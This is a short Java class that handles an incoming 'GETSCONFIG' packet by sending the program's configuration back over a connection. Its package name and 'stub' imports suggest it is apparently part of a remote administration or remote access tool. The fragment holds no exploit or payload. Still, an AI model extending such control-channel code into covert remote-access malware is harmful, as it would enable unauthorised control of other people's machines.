package com.redpois0n.packets.incoming;

import com.redpois0n.Connection;
import com.redpois0n.Main;
import com.redpois0n.stub.packets.outgoing.Header;
import com.redpois0n.stub.packets.outgoing.Packet66Config;

public class PacketGETSCONFIG extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {		
		Connection.addToSendQueue(new Packet66Config(Main.config));
	}

}
